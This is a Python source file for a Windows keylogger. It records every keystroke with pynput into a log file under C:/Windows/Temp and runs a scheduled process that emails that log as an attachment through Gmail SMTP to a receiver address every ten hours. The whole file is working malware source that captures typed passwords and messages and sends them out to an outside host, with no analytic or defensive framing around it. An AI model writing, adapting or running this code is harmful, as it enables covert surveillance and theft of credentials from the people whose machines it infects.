import pynput
from pynput.keyboard import Key, Listener
import logging
import smtplib, ssl 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders
import schedule
import time
import multiprocessing

def log():
    f=open('C:/Windows/Temp/keyLog.txt','w+')
    log_dir=r"C:/Windows/Temp/keyLog.txt"
    logging.basicConfig(filename=log_dir, level=logging.DEBUG, format='%(asctime)s: %(message)s')
    def on_press(key):
        logging.info(str(key))
    with Listener(on_press=on_press) as listener:
        listener.join()
    f.close()

def send_email():
    port = 465
    msg = MIMEMultipart()
    smtp_server = "smtp.gmail.com"
    sender_email = "dummy_email@gmail.com"
    receiver_email = "server_email@gmail.com"  
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Key Logger"
    body = "These are the logs"
    msg.attach(MIMEText(body, 'plain')) 
    filename = "keyLog.txt"
    attachment = open("C:/Windows/Temp/keyLog.txt", "rb") 
    p = MIMEBase('application', 'octet-stream') 
    p.set_payload((attachment).read())
    encoders.encode_base64(p) 
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
    msg.attach(p) 
    text = msg.as_string()
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, "dummy_account_password")
        server.sendmail(sender_email, receiver_email, text)

def scheduler():
    schedule.every(600).minutes.do(send_email)    #sends email to server account after every 10 hours
    while True:
        schedule.run_pending()
        time.sleep(1)

if __name__ == '__main__':
    p1=multiprocessing.Process(target=log)
    p2=multiprocessing.Process(target=scheduler)
    p1.start()
    p2.start()
